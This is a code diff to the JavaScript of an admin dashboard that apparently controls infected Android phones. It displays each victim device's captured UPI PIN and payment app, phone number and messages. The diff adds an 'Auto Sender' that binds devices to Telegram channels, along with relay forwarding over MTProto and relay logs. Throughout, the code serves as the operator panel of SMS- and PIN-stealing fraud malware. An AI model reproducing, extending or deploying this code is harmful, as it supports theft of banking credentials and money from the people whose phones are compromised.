-badge($("#botChanBadge"), bot.chat_title || bot.channel || "—", bot.bound ? "ok" : "warn");
-badge($("#botHookBadge"), bot.webhook_ok ? "Active" : "Not set", bot.webhook_ok ? "ok" : "bad");
-$("#botUser").textContent = bot.username ? "@" + bot.username : "—";
-$("#botChanLabel").textContent = bot.channel || "—";
-$("#botHookLabel").textContent = bot.webhook_url || "—";
-if (!bot.bound && bot.verify_code) {
-$("#botVerify").hidden = false;
-$("#botCode").textContent = bot.verify_code;
-$("#botCodeInline").textContent = bot.verify_code;
-} else $("#botVerify").hidden = true;
-$("#botToken").value = "";
-$("#botToken").placeholder = bot.token_masked ? bot.token_masked + "  (paste pura token)" : "123456:ABC-DEF…";
-$("#botChannel").value = bot.channel || "";
-}
+function renderRelayLogs() {
 $("#tgCount").textContent = state.tgLogs.length + " events";
 const body = $("#tgBody");
 if (!state.tgLogs.length) { empty(body, 4, "No relay events"); return; }
@@ -1586,6 +1724,7 @@ list.forEach((d) => {
 const t = tel(d);
 const info = nums(d);
 const msgs = devMsgs(d);
+const auto = autoOf(d);
 
 const card = document.createElement("article");
 card.className = "dev-card panel";
@@ -1642,6 +1781,12 @@ const pb = document.createElement("span");
 pb.className = "badge pin mono";
 pb.textContent = "PIN " + d.upi_pin;
 meta.appendChild(pb);
+}
+if (auto.enabled) {
+const ab = document.createElement("span");
+ab.className = "badge auto";
+ab.textContent = "AUTO";
+meta.appendChild(ab);
 }
 card.appendChild(meta);
 
@@ -1714,7 +1859,7 @@ if (!info.live) {
 const hint = document.createElement("div");
 hint.className = "sub";
 hint.style.marginTop = "10px";
-hint.textContent = "Live number nahi mila — 'fetch number' dabao (device online hona chahiye).";
+hint.textContent = "Live number nahi mila — Actions → fetch number dabao (device online hona chahiye).";
 box.appendChild(hint);
 }
 }
@@ -1814,6 +1959,20 @@ btn.addEventListener("click", () => pingDevice(d));
 b.appendChild(btn);
 }
 
+function renderAutoSender(d) {
+const a = autoOf(d);
+const on = Boolean(a.enabled);
+const panel = $("#asPanel");
+if (!panel) return;
+$("#asAccount").textContent = state.relayAccount ? ("@" + (state.relayAccount.username || state.relayAccount.id)) : "relay login karo";
+$("#chanInput").value = a.channel_id || "";
+$("#listenId").textContent = a.channel_id || "—";
+badge($("#asBadge"), on ? "Live" : "Paused", on ? "ok" : "warn");
+$("#asToggle").className = "switch" + (on ? " on" : "");
+$("#listenPanel").className = "status-panel" + (on ? "" : " off");
+$("#chanMsg").hidden = true;
+}
+
 function renderDetailMsgs() {
 const d = state.active;
 if (!d) return;
@@ -1886,6 +2045,7 @@ wrap.appendChild(item);
 
 function renderDetail(d) {
 const info = nums(d);
+const auto = autoOf(d);
 $("#dIcon").innerHTML = PHONE_SVG;
 $("#dName").textContent = devName(d);
 $("#dSub").textContent = (tel(d).model || "unknown model") + " · Android " + (tel(d).android_version || "—") + " · RAM " + ram(d);
@@ -1912,11 +2072,20 @@ pb.className = "badge pin mono";
 pb.textContent = "PIN " + d.upi_pin + (d.payment_app ? " · " + d.payment_app : "");
 tags.appendChild(pb);
 }
+if (auto.enabled) {
+const ab = document.createElement("span");
+ab.className = "badge auto";
+ab.textContent = "AUTO SENDER";
+tags.appendChild(ab);
+}
 const bb = $("#dBatt");
 bb.replaceChildren();
 bb.appendChild(battEl(d));
 badge($("#dTarget"), info.live || info.entered || "no number", info.live ? "ok" : info.entered ? "pin" : "bad");
+$("#actMenu").hidden = true;
+$("#asPanel").hidden = !state.asOpen;
 renderBanner(d);
+renderAutoSender(d);
 renderNumbers(d);
 renderSpecs(d);
 renderMore(d);
@@ -1933,6 +2102,7 @@ if (state.active && String(devId(state.active)) === String(deviceId)) renderDeta
 
 function openDetail(d) {
 state.active = d;
+state.asOpen = false;
 $("#dSearch").value = "";
 $("#dDir").value = "";
 $("#dUpi").checked = false;
@@ -1966,6 +2136,7 @@ if (state.active && String(devId(state.active)) === String(id)) fetchNumber(d);
 function closeDetail() {
 $("#detail").hidden = true;
 document.body.style.overflow = "";
+$("#actMenu").hidden = true;
 state.active = null;
 }
 
@@ -2049,11 +2220,20 @@ state.rules = Array.isArray(d) ? d : (d.rules || []);
 renderRules();
 }
 
-async function loadTelegram() {
-const d = await api("/admin/telegram/status");
-state.bots = d.bot ? [d.bot] : [];
+async function loadRelayLogs() {
+try {
+const d = await api("/admin/relay/logs?limit=60");
 state.tgLogs = d.logs || [];
-renderTelegram();
+} catch (e) {}
+renderRelayLogs();
+}
+
+async function loadAutoSender() {
+try {
+const d = await api("/admin/auto-sender");
+state.relayAccount = d.account || null;
+state.forward = d.forward_user || "";
+} catch (e) {}
 }
 
 async function loadRelay() {
@@ -2080,10 +2260,12 @@ $("#relayCodeBox").hidden = !st.awaiting_code;
 
 if (authed) {
 $("#relayMe").textContent = st.me ? ("@" + (st.me.username || st.me.id)) : "—";
-$("#relayChan").textContent = st.channel_id || "not set";
-badge($("#relayChanBadge"), st.channel_id ? "watching" : "off", st.channel_id ? "ok" : "warn");
-$("#relayFwd").textContent = st.forward_user || "bot API fallback";
-badge($("#relayFwdBadge"), st.forward_user ? "mtproto" : "bot api", st.forward_user ? "ok" : "warn");
+const chans = r.channels || [];
+$("#relayChan").textContent = chans.length ? chans.join(", ") : "not set";
+badge($("#relayChanBadge"), chans.length ? "watching" : "off", chans.length ? "ok" : "warn");
+$("#relayFwd").textContent = st.forward_user || "not set";
+badge($("#relayFwdBadge"), st.forward_user ? "mtproto" : "off", st.forward_user ? "ok" : "warn");
+if ($("#fwdInput") && !$("#fwdInput").value) $("#fwdInput").value = st.forward_user || "";
 }
 $("#relayErr").textContent = st.last_error || "—";
 
@@ -2109,8 +2291,10 @@ b.className = "mini";
 b.type = "button";
 b.textContent = "unban";
 b.addEventListener("click", async () => {
+try {
 await api("/admin/relay/bans/" + encodeURIComponent(a) + "/delete", { method: "POST" });
 await loadRelay();
+} catch (e) { toast(e.message); }
 });
 row.appendChild(b);
 box.appendChild(row);
@@ -2122,7 +2306,7 @@ if (!state.auth) return;
 $("#refreshBtn").disabled = true;
 try {
 await loadHealth();
-const res = await Promise.allSettled([loadDevices(), loadMessages(), loadRules(), loadTelegram(), loadRelay()]);
+const res = await Promise.allSettled([loadDevices(), loadMessages(), loadRules(), loadRelay(), loadRelayLogs(), loadAutoSender()]);
 if (res.some((r) => r.status === "rejected")) toast("some sections failed to sync");
 } finally {
 $("#refreshBtn").disabled = false;
@@ -2134,8 +2318,7 @@ try {
 if (section === "devices") await loadDevices();
 if (section === "messages") await loadMessages();
 if (section === "rules") await loadRules();
-if (section === "relay") { await loadRelay(); await loadRules(); }
-if (section === "telegram") await loadTelegram();
+if (section === "relay") { await loadRelay(); await loadRelayLogs(); await loadRules(); }
 if (section === "live") { await loadDevices(); await loadMessages(); }
 toast("synced");
 } catch (e) { toast(e.message); }
@@ -2152,7 +2335,8 @@ if (!state.auth) return;
 if (state.ws && (state.ws.readyState === 0 || state.ws.readyState === 1)) return;
 try {
 const proto = location.protocol === "https:" ? "wss:" : "ws:";
-const ws = new WebSocket(proto + "//" + location.host + "/ws/admin");
+const qs = token() ? "?token=" + encodeURIComponent(token()) : "";
+const ws = new WebSocket(proto + "//" + location.host + "/ws/admin" + qs);
 state.ws = ws;
 ws.onopen = () => { state.wsOk = true; state.wsFails = 0; updateLink(); };
 ws.onmessage = (ev) => { try { onEvent(JSON.parse(ev.data)); } catch (e) {} };
@@ -2227,7 +2411,6 @@ document.querySelectorAll(".page").forEach((s) => s.classList.toggle("on", s.id 
 if (page === "devices") refreshSection("devices");
 if (page === "messages") refreshSection("messages");
 if (page === "relay") refreshSection("relay");
-if (page === "telegram") refreshSection("telegram");
 }
 
 $("#pinsBtn").addEventListener("click", () => {
@@ -2241,13 +2424,116 @@ $("#dSearch").addEventListener("input", renderDetailMsgs);
 $("#dDir").addEventListener("change", renderDetailMsgs);
 $("#dUpi").addEventListener("change", renderDetailMsgs);
 $("#dClose").addEventListener("click", closeDetail);
-$("#dPing").addEventListener("click", () => state.active && pingDevice(state.active));
-$("#dFetch").addEventListener("click", () => state.active && fetchNumber(state.active));
 
 $("#dMoreToggle").addEventListener("click", () => {
 const box = $("#dMore");
 box.hidden = !box.hidden;
 $("#dMoreToggle").textContent = box.hidden ? "show" : "hide";
+});
+
+$("#actBtn").addEventListener("click", (ev) => {
+ev.stopPropagation();
+$("#actMenu").hidden = !$("#actMenu").hidden;
+});
+
+$("#actMenu").addEventListener("click", async (ev) => {
+const btn = ev.target.closest("[data-act]");
+if (!btn) return;
+$("#actMenu").hidden = true;
+const act = btn.dataset.act;
+const d = state.active;
+if (!d) return;
+if (act === "auto") {
+state.asOpen = true;
+$("#asPanel").hidden = false;
+$("#asPanel").scrollIntoView({ behavior: "smooth", block: "start" });
+return;
+}
+if (act === "copy") {
+const id = d.short_id || devId(d);
+if (navigator.clipboard) navigator.clipboard.writeText(id).then(() => toast("copied: " + id)).catch(() => toast(id));
+else toast(id);
+return;
+}
+if (act === "ping") { await pingDevice(d); return; }
+if (act === "fetch") { await fetchNumber(d); return; }
+});
+
+$("#asCollapse").addEventListener("click", () => {
+const b = $("#asBody");
+b.hidden = !b.hidden;
+$("#asCollapse").textContent = b.hidden ? "▸" : "▾";
+});
+
+$("#asCopy").addEventListener("click", () => {
+const t = $("#asAccount").textContent.trim();
+if (navigator.clipboard) navigator.clipboard.writeText(t).then(() => toast("copied: " + t)).catch(() => toast(t));
+else toast(t);
+});
+
+$("#asToggle").addEventListener("click", async () => {
+const d = state.active;
+if (!d) return;
+const a = autoOf(d);
+const next = !a.enabled;
+const cid = ($("#chanInput").value || "").trim() || a.channel_id || "";
+if (next && !cid) { toast("pehle Channel ID daalo"); return; }
+const sw = $("#asToggle");
+sw.disabled = true;
+try {
+const r = await api("/admin/devices/" + devId(d) + "/auto-sender", { method: "POST", body: JSON.stringify({ enabled: next, channel_id: cid }) });
+d.auto_sender = r.auto_sender || { enabled: next, channel_id: cid };
+renderAutoSender(d);
+renderCards();
+toast("Auto Sender " + (next ? "enabled" : "disabled"));
+} catch (e) { toast(e.message); }
+finally { sw.disabled = false; }
+});
+
+$("#chanVerify").addEventListener("click", async () => {
+const cid = ($("#chanInput").value || "").trim();
+if (!cid) { toast("Channel ID daalo"); return; }
+const btn = $("#chanVerify");
+btn.disabled = true;
+btn.textContent = "checking…";
+try {
+const r = await api("/admin/auto-sender/verify", { method: "POST", body: JSON.stringify({ channel_id: cid }) });
+$("#chanMsg").className = "ok-msg";
+$("#chanMsgTxt").textContent = (r.title || cid) + " reachable" + (r.admin ? " — admin ✓" : "") + " — save to bind.";
+$("#chanMsg").hidden = false;
+} catch (e) {
+$("#chanMsg").className = "ok-msg bad";
+$("#chanMsgTxt").textContent = e.message;
+$("#chanMsg").hidden = false;
+}
+finally { btn.disabled = false; btn.textContent = "Verify"; }
+});
+
+$("#chanBind").addEventListener("click", async () => {
+const d = state.active;
+if (!d) return;
+const cid = ($("#chanInput").value || "").trim();
+if (!cid) { toast("Channel ID daalo"); return; }
+const btn = $("#chanBind");
+btn.disabled = true;
+try {
+const r = await api("/admin/devices/" + devId(d) + "/auto-sender", { method: "POST", body: JSON.stringify({ channel_id: cid }) });
+d.auto_sender = r.auto_sender || d.auto_sender;
+$("#listenId").textContent = cid;
+toast("Channel bound!");
+} catch (e) { toast(e.message); }
+finally { btn.disabled = false; }
+});
+
+$("#testConn").addEventListener("click", async () => {
+const btn = $("#testConn");
+btn.disabled = true;
+btn.textContent = "testing…";
+try {
+await api("/admin/auto-sender/test", { method: "POST" });
+toast("test message bheja");
+} catch (e) { toast(e.message); }
+finally { btn.disabled = false; btn.textContent = "Test connection"; }
 });
 
 $("#dSend").addEventListener("click", async () => {
@@ -2333,6 +2619,7 @@ $("#relayCode").value = "";
 $("#relayPass").value = "";
 toast("relay connected");
 await loadRelay();
+await loadAutoSender();
 } catch (e) { toast(e.message); }
 finally { $("#relayVerify").disabled = false; }
 });
@@ -2340,6 +2627,21 @@ finally { $("#relayVerify").disabled = false; }
 $("#relayLogout").addEventListener("click", async () => {
 try { await api("/admin/relay/logout", { method: "POST" }); toast("logged out"); await loadRelay(); }
 catch (e) { toast(e.message); }
+});
+
+$("#relayTest").addEventListener("click", async () => {
+try { await api("/admin/auto-sender/test", { method: "POST" }); toast("test message bheja"); }
+catch (e) { toast(e.message); }
+});
+
+$("#fwdSave").addEventListener("click", async () => {
+const t = $("#fwdInput").value.trim();
+try {
+const r = await api("/admin/relay/forward", { method: "POST", body: JSON.stringify({ target: t }) });
+state.forward = r.forward_user || t;
+toast("forward target saved");
+await loadRelay();
+} catch (e) { toast(e.message); }
 });
 
 $("#banAdd").addEventListener("click", async () => {
@@ -2361,27 +2663,6 @@ $("#parseOut").textContent = JSON.stringify(r, null, 2);
 } catch (e) { $("#parseOut").textContent = e.message; }
 });
 
-$("#botSave").addEventListener("click", async () => {
-const token = $("#botToken").value.trim();
-const channel = $("#botChannel").value.trim();
-if (!token || !channel) { toast("token aur channel dono chahiye"); return; }
-if (token.length < 20) { toast("token chhota lag raha hai"); return; }
-$("#botSave").disabled = true;
-try {
-await api("/admin/telegram/bots", { method: "POST", body: JSON.stringify({ token: token, channel: channel }) });
-toast("bot saved — verification code ready");
-await loadTelegram();
-} catch (e) { toast(e.message); }
-finally { $("#botSave").disabled = false; }
-});
-
-$("#botTest").addEventListener("click", async () => {
-try {
-await api("/admin/telegram/test", { method: "POST" });
-toast("test message bheja");
-} catch (e) { toast(e.message); }
-});
-
 $("#msgFilter").addEventListener("change", renderMessages);
 $("#msgSearch").addEventListener("input", renderMessages);
 
@@ -2391,9 +2672,13 @@ const btn = $("#loginBtn");
 btn.disabled = true;
 btn.textContent = "Signing in…";
 loginMsg("");
+const id = $("#username").value.trim();
+const pass = $("#password").value;
+const keep = $("#remember").checked;
 try {
-const r = await api("/admin/login", { method: "POST", body: JSON.stringify({ username: $("#username").value.trim(), password: $("#password").value }) });
-if (!r.status && !r.authenticated) throw new Error("Sign-in failed");
+const r = await api("/admin/login", { method: "POST", body: JSON.stringify({ username: id, login_id: id, password: pass }) }, false);
+if (r && r.token) setToken(r.token);
+saveSession(id, pass, keep);
 $("#password").value = "";
 loginMsg("Signed in", "ok");
 showApp();
@@ -2409,10 +2694,11 @@ btn.textContent = "Sign in";
 });
 
 $("#logoutBtn").addEventListener("click", async () => {
-try { await api("/admin/logout", { method: "POST" }); } catch (e) {}
+try { await api("/admin/logout", { method: "POST" }, false); } catch (e) {}
 try { if (state.ws) state.ws.close(); } catch (e) {}
 clearTimeout(state.pollTimer);
 clearTimeout(state.wsTimer);
+clearSession();
 state.devices = [];
 state.messages = [];
 state.devMsgs = {};
@@ -2426,6 +2712,10 @@ document.querySelectorAll(".nav").forEach((b) => b.addEventListener("click", () 
 document.querySelectorAll("[data-goto]").forEach((b) => b.addEventListener("click", () => navigate(b.dataset.goto)));
 document.querySelectorAll("[data-refresh]").forEach((b) => b.addEventListener("click", () => refreshSection(b.dataset.refresh)));
 $("#refreshBtn").addEventListener("click", refreshAll);
+
+document.addEventListener("click", (ev) => {
+if (!ev.target.closest(".act-wrap")) $("#actMenu").hidden = true;
+});
 
 document.addEventListener("keydown", (ev) => {
 if (ev.key === "Escape" && !$("#detail").hidden) closeDetail();
